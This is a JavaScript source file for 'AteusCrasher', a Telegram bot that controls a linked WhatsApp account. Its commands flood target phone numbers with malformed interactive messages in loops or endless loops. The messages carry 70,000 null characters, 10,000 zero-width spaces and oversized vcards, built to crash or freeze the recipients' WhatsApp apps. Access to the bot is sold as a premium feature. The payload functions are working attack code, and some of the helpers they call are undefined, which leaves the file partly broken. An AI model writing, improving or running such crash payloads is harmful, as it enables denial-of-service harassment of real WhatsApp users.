const { Telegraf } = require("telegraf");
const fs = require('fs');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    fetchLatestBaileysVersion,
    generateWAMessageFromContent,
    DisconnectReason,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./config.js");
const moment = require('moment-timezone');

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function getGitHubData(path) {
    const octokit = await loadOctokit();
    try {
        const response = await octokit.repos.getContent({
            owner,
            repo,
            path,
        });
        const content = Buffer.from(response.data.content, 'base64').toString();
        return { data: JSON.parse(content), sha: response.data.sha };
    } catch (error) {
        console.error("Error fetching :", error);
        return { data: null, sha: null };
    }
}

async function updateGitHubData(path, content, sha) {
    const octokit = await loadOctokit();
    try {
        await octokit.repos.createOrUpdateFileContents({
            owner,
            repo,
            path,
            message: `Update`,
            content: Buffer.from(JSON.stringify(content, null, 2)).toString('base64'),
            sha,
        });
        console.log(`updated successfully.`);
    } catch (error) {
        console.error("Error updating data on GitHub:", error);
    }
}

// ========================= [ BOT INITIALIZATION ] =========================

const bot = new Telegraf(tokenBot);
let hanzz = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

// ========================= [ UTILITY FUNCTIONS ] =========================

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));


// ========================= [ PREMIUM USER MANAGEMENT ] =========================

const premiumFile = './premiumvip.json';

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

// ========================= [ BAILEYS CONNECTION ] =========================

const startSesi = async () => {
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Succes Connected',
        }),
    };

    hanzz = makeWASocket(connectionOptions);
    
    hanzz.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                console.log("⚠️ Tidak ada pesan masuk.");
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

            console.log(`ID SALURAN : ${chatId}`);
        } catch (error) {
            console.error("❌ Error membaca pesan:", error);
        }
    });
    
    if (usePairingCode && !hanzz.authState.creds.registered) {
        console.clear();
        let phoneNumber = await question(chalk.bold.white(`\nINPUT YOUR NUMBER SENDER !\n`));
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        const code = await hanzz.requestPairingCode(phoneNumber.trim());
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(chalk.bold.white(`YOUR CODE `), chalk.bold.white(formattedCode));
    }

    hanzz.ev.on('creds.update', saveCreds);
    store.bind(hanzz.ev);
    
    global.idch = "120363405397839812@newsletter"

    hanzz.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        hanzz.newsletterFollow(global.idch)  
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.white(`
Script: AteusCrasher
Versi: 1.0
Status: `) + chalk.bold.green('Terhubung') + chalk.bold.white(`
Developer: AlwaysHanz,
WhatsApp: 6281936513894
Waktu: ${currentTime} WIB`));
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus.'),
                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();



// ========================= [ MIDDLEWARE ] =========================

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("Nomor sender tidak di temukan atau tidak terhubung");
        return;
    }
    next();
};

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ Maaf, fitur ini hanya untuk pengguna premium.");
        return;
    }
    next();
};

// ========================= [ TOKEN MANAGEMENT COMMANDS (Only for Developers) ] =========================

bot.command('addtoken', async (ctx) => {
    if (!developerIds.includes(String(ctx.from.id))) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /addtoken [token_bot]");
    }
    const newToken = args[1];
    await addToken(newToken);
    ctx.reply(`✅ Berhasil menambahkan token: ${newToken}`);
});

bot.command('deltoken', async (ctx) => {
    if (!developerIds.includes(String(ctx.from.id))) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /deltoken [token_bot]");
    }
    const tokenToDelete = args[1];
    await deleteToken(tokenToDelete);
    ctx.reply(`✅ Berhasil menghapus token: ${tokenToDelete}`);
});

// ========================= [ PREMIUM USER MANAGEMENT COMMANDS ] =========================

// /addprem command
bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("Format: /addprem [user_id] [duration_in_days]");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("Durasi harus berupa angka (dalam hari).");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ Berhasil menambahkan ${userId} sebagai pengguna premium hingga ${expiryDate}`);
});

// /delprem command
bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /delprem [user_id]");
    }
    const userId = args[1];
    removePremiumUser(userId);
    ctx.reply(`✅ Berhasil menghapus ${userId} dari daftar pengguna premium.`);
});

// /cekprem command
bot.command('cekprem', async (ctx) => {
    const userId = ctx.from.id;
    if (isPremiumUser(userId)) {
        const expiryDate = loadPremiumUsers()[userId];
        ctx.reply(`✅ Anda adalah pengguna premium hingga ${expiryDate}`);
    } else {
        ctx.reply(`❌ Anda bukan pengguna premium.`);
    }
});

// /listprem command
bot.command('listprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Maaf, hanya owner yang bisa menggunakan perintah ini.");
    }
    const premiumUsers = loadPremiumUsers();
    let message = "<b>Daftar Pengguna Premium:</b>\n";
    for (const userId in premiumUsers) {
        const expiryDate = premiumUsers[userId];
        message += `\n- ${userId}: ${expiryDate}`;
    }
    if (message === "<b>Daftar Pengguna Premium:</b>\n") {
        message = "Tidak ada pengguna premium.";
    }
    ctx.reply(message, { parse_mode: 'HTML' });
});

// ========================= [ MODERATOR MANAGEMENT COMMANDS ] =========================

bot.command('addmoderatorid', async (ctx) => {
    if (!developerIds.includes(String(ctx.from.id))) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /addmoderatorid [user_id]");
    }
    const userId = args[1];
    await addModerator(userId);
    ctx.reply(`✅ Berhasil menambahkan ${userId} sebagai moderator.`);
});

bot.command('delmoderatorid', async (ctx) => {
    if (!developerIds.includes(String(ctx.from.id))) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /delmoderatorid [user_id]");
    }
    const userId = args[1];
    await deleteModerator(userId);
    ctx.reply(`✅ Berhasil menghapus ${userId} dari daftar moderator.`);
});

// ========================= [ START MESSAGE AND MENU ] =========================

bot.start(ctx => {
    const menuMessage = `
<blockquote>
<b>╭━━━[ AteusCrasher ]</b>
<b>┃ Developer : AlwaysHanzz</b>
<b>┃ Version : 1.0</b>
<b>┃ Language : commonJs</b>
<b>╰━━━━━━━━━━━━━━❍</b>

<b>╭━━━[ USER INFO ]</b>
<b>┃ Pengguna : ${ctx.from.first_name}</b>
<b>┃ Sender : ${isWhatsAppConnected ? '✅' : '❌'}</b>
<b>┃ Moderator : ${isModerator(ctx.from.id) ? '✅' : '❌'}</b>
<b>┃ Premium : ${isPremiumUser(ctx.from.id) ? '✅' : '❌'}</b>
<b>╰━━━━━━━━━━━━━━❍</b>

<b>╭━━━[ CURSED TECHNIQUE ]</b>
<b>┃ /crashjids</b>
<b>┃ /crashperma</b>
<b>┃ /invisiblecrash</b>
<b>┃ /forclose</b>
<b>┃ /crashapp</b>
<b>┃ /invis</b>
<b>┃ /delayXcrash</b>
<b>┃ /delayui<b/>
<b>╰━━━━━━━━━━━━━━❍</b>
</blockquote>
`;

    const photoUrl = "https://files.catbox.moe/xzx2m3.jpg";

    const keyboard = [
        [
            {
                text: "CONTROLS (🚯)",
                callback_data: "/menu"
            }
        ]
    ];

    ctx.replyWithPhoto(photoUrl, {
        caption: menuMessage,
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

// ========================= [ OWNER MENU ] =========================

bot.action('/menu', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ Maaf, menu ini hanya untuk owner.");
    }

    const ownerMenu = `
<b>╭━━━[ OWNER MENU ]</b>
<b>┃ /addprem [user_id] [duration_in_days]</b>
<b>┃ /delprem [user_id]</b>
<b>┃ /cekprem</b>
<b>┃ /listprem</b>
<b>┃ /addtoken [token_bot]</b>
<b>┃ /deltoken [token_bot]</b>
<b>┃ /addmoderatorid [user_id]</b>
<b>┃ /delmoderatorid [user_id]</b>
<b>╰━━━━━━━━━━━━━━━━━━━❍</b>
    `;

    const keyboard = [
        [
            {
                text: "Back to Main Menu",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(ownerMenu, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        console.error("Error updating message:", error);
        if (error.response && error.response.error_code === 400 && error.response.description === "Bad Request: message is not modified: specified new message content and reply markup are exactly the same as a current content and reply markup of the message") {
            console.log("Message is not modified. Skipping update.");
            await ctx.answerCbQuery();
        } else {
            await ctx.reply("Terjadi Overload Silahkan Coba Lagi");
        }
    }
});

// ========================= [ BACK TO START HANDLER ] =========================

bot.action('/start', async (ctx) => {
    const menuMessage = `
<blockquote>
<b>╭━━━[ AteusCrasher ]</b>
<b>┃ Developer : AlwaysHanzz</b>
<b>┃ Version : 1.0</b>
<b>┃ Language : commonJs</b>
<b>╰━━━━━━━━━━━━━━❍</b>

<b>╭━━━[ USER INFO ]</b>
<b>┃ Pengguna : ${ctx.from.first_name}</b>
<b>┃ Sender : ${isWhatsAppConnected ? '✅' : '❌'}</b>
<b>┃ Moderator : ${isModerator(ctx.from.id) ? '✅' : '❌'}</b>
<b>┃ Premium : ${isPremiumUser(ctx.from.id) ? '✅' : '❌'}</b>
<b>╰━━━━━━━━━━━━━━❍</b>

<b>╭━━━[ CURSED TECHNIQUE ]</b>
<b>┃ /crashjids</b>
<b>┃ /crashperma</b>
<b>┃ /invisiblecrash</b>
<b>┃ /forclose</b>
<b>┃ /crashapp</b>
<b>┃ /invis</b>
<b>┃ /delayXcrash</b>
<b>┃ /delayui<b/>
<b>╰━━━━━━━━━━━━━━❍</b>
</blockquote>
`;

    const photoUrl = "https://files.catbox.moe/xzx2m3.jpg";

    const keyboard = [
        [
            {
                text: "CONTROLS (🚯)",
                callback_data: "/menu"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: photoUrl,
            caption: menuMessage,
            parse_mode: 'HTML',
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        console.error("Error updating message:", error);
        if (error.response && error.response.error_code === 400 && error.response.description === "Bad Request: message is not modified: specified new message content and reply markup are exactly the same as a current content and reply markup of the message") {
            console.log("Message is not modified. Skipping update.");
            await ctx.answerCbQuery();
        } else {
            await ctx.reply("Terjadi Overload Silahkan Coba Lagi");
        }
    }
});
// ========================= [ TELEGRAM BOT COMMANDS ] =========================

bot.command('addtoken', async (ctx) => {
    if (ctx.from.id != developerId) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /addtoken [token_bot]");
    }
    const newToken = args[1];
    await addToken(newToken);
    ctx.reply(`✅ Token berhasil ditambahkan.`);
});

bot.command('deltoken', async (ctx) => {
    if (ctx.from.id != developerId) {
        return ctx.reply("❌ Maaf, hanya developer yang bisa menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("Format: /deltoken [token_bot]");
    }
    const tokenToDelete = args[1];
    await deleteToken(tokenToDelete);
    ctx.reply(`✅ Token berhasil dihapus.`);
}); 

bot.action('startback', async (ctx) => {
 const userId = ctx.from.id.toString();
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
  const buttons = Markup.inlineKeyboard([
         [
             Markup.button.callback('𝐁͢𝐮͡𝐠𝐌͜𝐞͢𝐧͡𝐮', 'belial'),
             Markup.button.callback('𝐎͢𝐰͡𝐧͜𝐞͢𝐫𝐌͜𝐞͢𝐧͡𝐮', 'belial2'),
         ],
         [
             Markup.button.url('⌜ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 ⌟', 'https://wa.me/6281936513894'),
             Markup.button.url('⌜ 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 ⌟', 'https://wa.me/6281936513894'),
         ]
]);

  const caption = `\`\`\`
Holaa , Aku Adalah AteusCrasher Yang Di Buat Oleh AlwaysHanzz Saya Siap Membantu Anda 

╭━─━( AteusCrasher )━─━⍟
┃ ▢ Developer : AlwaysHanzz
┃ ▢ Version : 1.0
┃ ▢ Language : commonJs
┃ ▢ Runtime : ${waktuRunPanel} 
╰━─━━─━━─━━─━━─━━━─━⍟\`\`\``;

  await editMenu(ctx, caption, buttons);
});

//~~~~~~~~~~~~~~~~~~END~~~~~~~~~~~~~~~~~~~~\\

// Fungsi untuk mengirim pesan saat proses selesai
const donerespone = (target, ctx) => {
    const RandomBgtJir = getRandomImage();
    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna"; // Mengambil nama peminta dari konteks
    
     ctx.replyWithPhoto(RandomBgtJir, {
    caption: `
┏━━━━━━━━━━━━━━━━━━━━━━━❍
┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
┃
┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
┗━━━━━━━━━━━━━━━━━━━━━━━❍
`,
         parse_mode: 'Markdown',
                  ...Markup.inlineKeyboard([
                    [
                       Markup.button.callback('𝙱𝙰𝙲𝙺', 'alwayshanzz'),
                       Markup.button.url('⌜ 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 ⌟', 'https://wa.me/6281936513894'),
                    ]
                 ])
              });
              (async () => {
    console.clear();
    console.log(chalk.black(chalk.bgGreen('Succes Send Bug By AteusCrasher')));
    })();
}

bot.command("invisiblecrash", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashjids 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 70; i++) {
    await payouthanzz(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

bot.command("crashperma", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashperma 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 100; i++) {
    await payouthanzz(target);
    await payouthanzz(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

bot.command("crashapp", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashperma 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 100; i++) {
    await payouthanzz(target);
    await pendingpay(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

bot.command("delayXcrash", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/delayXcrash 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`Successfully✅`);

    while (true) {
      await protocolbug2(target, true)
      await protocolbug2(target, true) 
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

bot.command("forceclose", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/forceclose 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`Successfully✅`);

    while (true) {
      await protocolbug2(target, true)
      await protocolbug2(target, true) 
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});


bot.command("invis", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/zeroinvis 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`Successfully✅`);

    while (true) {
      await protocolbug2(target, true)
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

bot.command("delayui", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/delayui 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`Successfully✅`);

    for (let i = 0; i < 30; i++) {
      await UIXFC(target);
      await indictiveUI(target);
      await indictiveUI(target);
      await UIXFC(target);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

async function payouthanzz(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "CAPSLOCK 🐉🐉🐉"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
    }
  }, { userJid: target });

  await hanzz.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}

async function buttoncast(target) {
  const buttons = [];

  for (let i = 0; i < 1000; i++) {
    buttons.push({
      name: `order_${i + 1}`,
      buttonParamsJson: {
        reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
        order: {
          status: "completed",
          order_type: "ORDER"
        },
        share_payment_status: true
      }
    });
  }

  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: buttons,
        messageParamsJson: {
          title: "(🐉) CAST ( ONE hanzz )",
          body: "hanzz SCHEMA 🐉🐉🐉"
        }
      }
    }
  }, { userJid: target });

  await hanzz.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}

async function pendingpay(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: JSON.stringify({
              reference_id: Math.random().toString(36).substring(2, 10).toUpperCase(),
              order: {
                status: "pending",
                order_type: "ORDER"
              },
              share_payment_status: true
            })
          }
        ],
        messageParamsJson: JSON.stringify({
          title: "\u0000".repeat(70000), 
          body: "🐉🐉🐉"
        })
      }
    }
  }, { userJid: bijipler });

  await hanzz.relayMessage(bijipler, msg.message, { 
    messageId: msg.key.id
  });
}

async function vcardcrash(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: JSON.stringify({
              reference_id: Math.random().toString(36).substring(2, 10).toUpperCase(),
              order: {
                status: "pending", 
                order_type: "ORDER"
              },
              share_payment_status: true,
              call_permission: true 
            })
          },
          {
            name: "contact", 
            buttonParamsJson: JSON.stringify({
              vcard: {
                full_name: "Hanzz Chema ".repeat(4000),
                phone_number: "+6281936513894",
                email: "hanzzexploit@iCloud.com",
                organization: "AlwaysHanzz Exploiter",
                job_title: "Customer Support"
              }
            })
          }
        ],
        messageParamsJson: JSON.stringify({
          title: "\u200B".repeat(10000), 
          body: "GIDEOVA_PAYMENT_STATUSED"
        })
      }
    }
  }, { userJid: target });

  await hanzz.relayMessage(target, msg.message, { 
    messageId: msg.key.id
  });
}


//